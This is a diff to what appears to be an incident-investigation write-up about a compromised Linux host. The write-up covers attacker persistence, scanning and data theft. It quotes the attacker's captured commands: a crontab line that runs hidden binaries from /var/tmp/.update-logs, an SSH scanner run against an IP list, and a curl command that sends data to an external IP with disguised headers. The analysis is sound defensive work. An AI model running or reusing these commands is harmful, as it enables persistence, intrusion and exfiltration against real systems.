@@ -295,7 +295,11 @@ Effect: This tactic guarantees that malicious activities continue running in the
 
 ![image](https://github.com/user-attachments/assets/52f228b7-4bff-43af-b80c-f9f42ad8477f)
 ```
-bash -c "echo '@daily /var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @reboot /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * * /var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @monthly /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * * /var/tmp/.update-logs/./.b >/dev/null 2>&1 & disown' | crontab -"
+bash -c "echo '@daily
+ /var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @reboot /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
+/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown @monthly /var/tmp/.update-logs/./Update >/dev/null 2>&1 & disown * * * * *
+/var/tmp/.update-logs/./.b >/dev/null 2>&1 & disown'
+| crontab -"
 ```
 
 This command created multiple cron jobs to execute files from the /var/tmp/.update-logs/ directory on a daily, monthly, and minute-by-minute basis. These jobs are set to run in the background using the disown command to detach from the terminal and avoid monitoring.
@@ -312,7 +316,12 @@ History: Likely logs or tracks system history.
 
 
 ```
-bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulimit -n 999999 ; cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8 ; /var/tmp/.update-logs/x"
+bash -c "cd /var/tmp/.update-logs ;
+ chmod +x /var/tmp/.update-logs/.bisis ;
+ulimit -n 999999 ;
+cat /var/tmp/.update-logs/iplist
+| /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8 ;
+ /var/tmp/.update-logs/x"
 ```
 This command executes the .bisis file after setting permissions to allow execution (chmod +x). The ulimit -n 999999 command increases the maximum number of open file descriptors, indicating an attempt to handle a large volume of connections or network operations.
 
@@ -359,6 +368,35 @@ The awk command filters through a file named .temp to extract IP addresses relat
 ![image](https://github.com/user-attachments/assets/1e9df02a-93b6-4f2d-b60b-37f134e88c30)
 
 These commands are characteristic of post-compromise activity, where the attacker is leveraging the system to extract valuable information, likely to exploit SSH vulnerabilities or credential weaknesses further. The suspicious behavior of processing data in hidden directories like /var/tmp/.update-logs/ and using tools like awk, grep, and cat to sift through data files and logs points to a malicious intent.
+
+At 0826 AM another ssshd pattern was observed followed by another /var/tmp/.update-logs/Update pattern at 0829 AM and a CRON command for /bin/sh -c "/var/tmp/.update-logs/./History >/dev/null 2>&1 & disown" at 0831 AM followed by another at 0833 AM ending in a ./cache command. Theses series of patterns occur once more before 0846 AM until a shutdown executed by root occured at 0904 AM March 14th 2025. The Device would be active again at March 17 2025 at 0320 AM, a CRON to update-logs, cache, and pidof update pattern was observed at 0321 AM indicating that the malware was still present during the authorized user's labs 
+
+![image](https://github.com/user-attachments/assets/da0832d5-6da9-4a56-a967-b248a23ca3ad)
+
+The Device carries on as usual with the malware, until a suspcious telnet login attempt was made at 0328 AM from IP 114.41.214.182 which turned out to be from taiwan, the process logs continued to show telnet processes which would be indicative of a continued presence from the previous telnet login followed by a series of what appear to be Reconnaissance Activity
+
+![image](https://github.com/user-attachments/assets/9f3c14dd-4c35-420d-b47f-7688ac5dd5c9)
+![image](https://github.com/user-attachments/assets/066b8a45-a88b-4c97-a69d-22a40081e0f6)
+
+From that time until 0343 AM, the user applied updates to the linux machine however the malware was still present as observed at 0344 AM when a CRON to update-logs pattern occured. The device then proceeds as usual with the malware until new behavior from the malware was observed at 0448 AM, this behavior is consistent with data exfiltration when observing the code:
+
+```
+bash -c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
+			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+			-H 'Accept-Language: en-US,en;q=0.9' \
+			-H 'Cache-Control: max-age=0' \
+			-H 'Connection: keep-alive' \
+			-H 'Upgrade-Insecure-Requests: 1' \
+			--insecure'
+'''
+
+![image](https://github.com/user-attachments/assets/31143b39-2e80-4ca9-963c-3d242ffc0b0a)
+
+This process is trying to exfiltrate data to an external IP 196.251.73.38 using the curl command. It is passing an IP address 200.98.137.5 as a parameter in the URL, possibly representing the internal system IP or another target in the attack chain. The command includes several headers (e.g., Accept, Accept-Language, Connection, etc.), indicating the request is trying to mimic legitimate web traffic, but using the --insecure flag to bypass SSL certificate verification, further supporting that this is malicious.
+
+These logs show that the process repeats itself multiple times, indicating that data exfiltration is continuous. This behavior strongly points to an active and persistent compromise, where the attacker is collecting and sending sensitive information out of the system in small batches to avoid detection. There were 196 occurrences with a total file size of 162,371,104 bytes (around 162 MB).
+
+This behavior would now be observed in addition to the usual malware behavior throughout the rest of the device's activities
 
 ### 3. Analyzing File Events
 To understand the extent of the data compromise, I searched the DeviceFileEvents table for actions initiated by the attacker under the new user account chadwick.s. I discovered that the attacker accessed and likely stole a sensitive file named CRISPR-X__Next-Generation_Gene_Editing_for_Artificial_Evolution.pdf alognside other files in a zip file named gene_editing_papers, a high-value target that could indicate a larger espionage operation targeting proprietary research.
